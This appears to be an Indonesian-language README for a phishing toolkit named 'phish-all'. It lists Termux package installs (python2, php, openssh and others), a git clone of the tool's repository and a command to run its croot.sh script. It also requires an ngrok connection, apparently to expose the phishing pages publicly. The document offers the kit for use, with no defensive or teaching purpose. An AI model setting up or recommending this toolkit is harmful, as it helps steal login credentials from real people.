# phish-all

Cara menggunakan dan persyaratan
1.harus connect ngorok
2.dilarang Recode
3.kalau bingung cara connect ngroh silahkan liat YouTube
4.BY.MR.CROOT

$ pkg update && pkg upgrade

$ pkg install python2

$ pkg install bash

$ pkg install ruby

$ gem install lolcat

$ pkg install figlet

$ pkg install toilet

$ pkg install openssh

$ pkg install php

$ pkg install git

$ git clone https://github.com/reyspeed/phish-all

$ cd phish-all

$ bash croot.sh
